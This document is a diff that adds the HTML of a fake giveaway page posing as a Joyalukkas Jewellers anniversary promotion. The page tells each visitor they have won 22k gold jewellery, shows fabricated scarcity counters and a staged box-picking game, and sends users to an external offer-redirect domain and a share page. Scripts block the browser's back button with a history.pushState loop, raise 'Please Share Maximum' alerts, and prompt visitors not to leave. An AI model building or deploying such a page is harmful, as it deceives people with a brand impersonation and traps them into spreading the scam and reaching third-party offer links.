@@ -1,0 +1,274 @@
+
+<!doctype html>
+<html lang="en" dir="ltr">
+<head>
+ 
+
+
+  <script type="text/javascript">
+
+	if(navigator.browserLanguage) {  
+      var language = navigator.browserLanguage;    
+   }
+   else if(navigator.language) {
+      var language = navigator.language;
+   }
+   
+   switch (language.substring(0,2))  {
+      
+      case "" : location.href="share.html";
+         break;
+}
+
+</script>
+     
+<title>Joy home 1</title>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="🎊On the occasion of 36th Anniversary, Joyalukkas Jewellers offers gold bracelets and exclusive gifts🎁" />
+	<meta property="og:type" content="website" /> 
+	<meta property="og:url" content="https://joyalukkas.in" />
+	<meta property="og:image" content="dBQy18G.jpg" />
+	<meta property="og:description" content="🎉joyalukkas's Anniversary Celebration💐" />
+
+ 
+<meta name="robots" content="noindex,nofollow">
+
+
+</head>
+<body>
+  <style>
+    @import "https://fonts.googleapis.com/css?family=Pacifico&display=swap";html{height:100%}body{background:#fff;color:#fff;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,Noto Sans,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji;font-size:17px;margin:0;min-height:100%;text-align:center}.app{align-items:center;box-sizing:border-box;display:flex;justify-content:center;padding:20px}.left,.right{align-self:start;margin:0 20px;max-width:400px;width:100%}.product-preview__title{font-family:Pacifico,sans-serif;font-size:36px}.product-preview__image{max-width:404px;width:100%}.survey{background:#eaeaea;font-size:18px;font-weight:700;max-width:none;padding:40px;position:relative;text-align:center}.survey__question{color:#000}.survey__answer{background:#A51D3B;border:8px solid #A51D3B;border-radius:14px;box-shadow:none;color:#fff;cursor:pointer;display:block;font-size:30px;font-weight:700;line-height:28px;margin-top:15px;padding:19px 20px;text-decoration:none;width:100%}.survey__steps{margin-top:20px}.survey__step{background:#fff;border-radius:50%;display:inline-block;font-size:0;height:30px;margin:0 5px;width:30px}.survey__step--active{background:#A51D3B}.modal{color:#000;z-index:6}.modal__content{background-color:#f7f3ed;padding:20px}.opening-modal__image{max-width:205px;width:100%}.button{background-color:#A51D3B;border:none;border-radius:.25rem;color:#fff;display:inline-block;font-size:1.6rem;font-weight:400;line-height:1.5;padding:.25rem 2.70rem;text-decoration:none;transition:color .15s ease-in-out,background-color .15s ease-in-out,border-color .15s ease-in-out,box-shadow .15s ease-in-out;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;vertical-align:middle}.button,.verify{text-align:center}.verify{background:#eaeaea;color:#000;padding:40px}.verify__text{padding:2px 0}.verify__icon{max-width:13px}.verify__icon--spinner{opacity:0}.verify__icon--visible{opacity:1}.text-rotator{font-size:21px;margin-bottom:10px}@media(max-width:640px){.app{flex-direction:column}.left,.right{margin:0;max-width:none;width:100%}.survey{padding:20px}.survey__answer{font-size:20px;line-height:18px;padding:10px}}
+    </style>
+  <style>
+    #claim {
+    display: none;
+}
+    
+button:hover {
+    background: #A51D3B;
+}
+.phone {
+    max-width: 400px;
+    margin: 10px auto;
+}
+.phone input {
+    width: 60%;
+    height: 50px;
+    padding: 10px;
+    outline: none;
+    border: 2px solid #cecece;
+    font-size: 14px;
+}
+#confirm {
+    width: 40%;
+    float: left;
+    margin: 0;
+    border-radius: 0px;
+}
+   
+.barr {
+    direction: ltr;
+    max-width: 400px;
+    margin: 10px auto;
+    box-sizing: border-box;
+}
+.fill {
+    position: relative;
+    display: inline-block;
+    width: calc(100% - 100px);
+    height: 35px;
+    padding: 2px;
+    border: 2px solid #ed1c24;
+}
+#fill,
+#fill2 {
+    background: #ed1c24;
+    width: 0%;
+    height: 100%;
+}
+.percentage {
+    color: #000;
+    width: 100px;
+    float: right;
+    height: 35px;
+    font-size: 16px;
+    border: 2px solid #ed1c24;
+}
+#percentage,
+#percentage2 {
+    margin-left: 5px;
+}
+    .done {
+    text-align: center;
+    color: #c7db49;
+}
+.tip {
+    font-size: 14px;
+}
+.title {
+    text-align: center;
+}
+    [v-cloak]{display:none!important}
+    </style>
+<div class="app" id="app" v-cloak>
+<vue-modal v-show="!showRotator && !showPrize" :open="showOpeningModal" class="opening-modal">
+<img class="opening-modal__image" src="Joyalukkas-logo.png" alt="lulu" />
+<h1 class="heading heading--h1">
+Congratulations! 
+</h1>
+<p class="paragraph">
+Joyalukkas Jewellers 36th Anniversary Celebration, Everyone have chance to win amazing 22k gold gifts. 
+</p>
+<p class="paragraph">
+  Click "OK" to claim your reward
+</p>
+<button class="button" v-on:click="showOpeningModal = false; $confetti.stop()">
+OK
+</button>
+  
+</vue-modal>
+<vue-modal :open="showInstructionsModal">
+<h2 class="heading heading--h1">Congratulation ! Your answers have been saved</h2>
+ 
+<p class="paragraph">
+Now you have a chance to win valuable prizes
+<br><br>
+You have 3 Chances !  We wish you good luck
+<br><br>
+You need to select the box that has the gift inside the boxes. 
+</p>
+<button class="button" v-on:click="showInstructionsModal = false">
+Start
+</button>
+</vue-modal>
+<vue-modal :open="showFailModal">
+<h1 class="heading heading--h1">Better luck next time</h1>
+<p class="paragraph">
+You have (2) extra chances. 
+</p>
+<button class="button" v-on:click="showFailModal = false">
+OK
+</button>
+</vue-modal>
+<vue-modal :open="showSuccessModal">
+<img src="44VFnbx.jpeg" style="width: 269px;">
+<h1 class="heading heading--h1">Congratulations! </h1>
+<p class="paragraph">
+You have won <br><b>a Gold Chain and  Bracelet(22 karat, 21.8 grams)</b><br>Click Ok Below to claim your Prize in Next Page. 
+</p>
+   
+<button class="button" onclick="go();">
+OK
+</button>
+</vue-modal>
+  
+<div class="left">
+<div class="product-preview">
+<div class="product-preview__title">
+  
+
+</div>
+<img class="product-preview__image" src="nSAbF2w.jpeg" alt="Apple iPhone 14 Pro Max" /><br>
+</div>
+</div>
+<div class="right">
+<vue-box-picker v-if="showBoxPicker" :vertical-items="3" lid-image="DZPG8FV.png" box-image="NfgjBYo.png" box-back-image="ALbVyT8.png" prize-image="44VFnbx.jpeg" v-on:fail="onBoxPickerFail" v-on:success="onBoxPickerSuccess" :horizontal-items="3" :max-clicks="2"></vue-box-picker>
+<div class="verify" v-if="showRotator">
+<vue-text-rotator v-on:rotate="rotate" v-on:finished="onRotatorFinished" :strings='[
+                     "Please wait a moment...",
+              "Please wait a moment...",
+              "Please wait a moment..."
+            ]'>
+</vue-text-rotator>
+<div class="verify__text" v-if="rotateIndex > 1">
+<strong>
+You have answered 4/4 of the questions
+</strong>
+<img class="verify__icon verify__icon--checked" src="checked.png" alt="" />
+</div>
+<div class="verify__text" v-else>
+Your answers are being processed
+<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 0}" src="spinner.gif" alt="" />
+</div>
+<div class="verify__text" v-if="rotateIndex > 2">
+<strong>
+There are still prizes available!
+</strong>
+<img class="verify__icon verify__icon--checked" src="checked.png" alt="" />
+</div>
+<div class="verify__text" v-else>
+Looking for gifts.. 
+<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 1}" src="spinner.gif" alt="" />
+</div>
+<div class="verify__text" v-if="rotateIndex > 3">
+<strong>
+Only (78) gifts remain!
+</strong>
+<img class="verify__icon verify__icon--checked" src="checked.png" alt="" />
+</div>
+<div class="verify__text" v-else>
+Stock is being checked
+<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 2 }" src="spinner.gif" alt="" />
+</div>
+</div><br>
+<vue-survey v-if="showSurvey" :show-steps="true" :questions='[
+            {
+              title: "Do you Know Joyalukkas? ",
+              answers: [ { text: "Yes" }, { text: "No" } ]
+            },
+             {
+              title: "Are you Male or Female? ",
+              answers: [ { text: "Male" }, { text: "Female" } ]
+            },                                               
+            {
+              title: "How old are you ?",
+              answers: [ { text: "18-29" }, { text: "30-39" }, { text: "40-49" }, { text: "50+" } ]
+            },
+            {
+              title: "What do you think about us? ",
+              answers: [ { text: "Very satisfied" }, { text: "Amazing" }, { text: "Good" }, { text: "Bad" }, { text: "Average" } ]
+            },
+          ]' v-on:finish="onSurveyFinish"></vue-survey>
+</div>
+
+  <img src='images.jpeg' width='100%'/><br/>
+  </div>
+<br><br>
+<script>window.view = window.view || {};view.offerUrl = "https:\/\/rdr.funcontent.xyz/click";view.qs = null;view.skip = 0;view.screenshot = 0;view.download = 1;view.noredir = false;</script> <script src="js/app.js?id=d41d8cd98f00b204e980" type="application/javascript"></script>
+<script src="app.js?id=17138759790b445ece6b" type="application/javascript"></script>
+  
+<script>
+function go() {
+    window.onbeforeunload = null;
+    window.location = 'share.html';
+}
+</script>
+<script>
+var PreventExitPop = true;
+
+function ExitPop() {
+    if (PreventExitPop != false) {
+        return "Don't miss out!";
+    }
+}
+window.onbeforeunload = ExitPop;
+</script>
+
+
+
+
+</body>
+</html>
+
+
+
+      <script type="text/javascript">! function (){	var t;	try{for (t=0; 10 > t; ++t)		history.pushState({}, "", "#");	onpopstate=function (t)	{		t.state && alert('Please Share Maximum to receive gift. ');		}}		catch (o){}}();</script>
+ 
+ 
+
+      
+
+
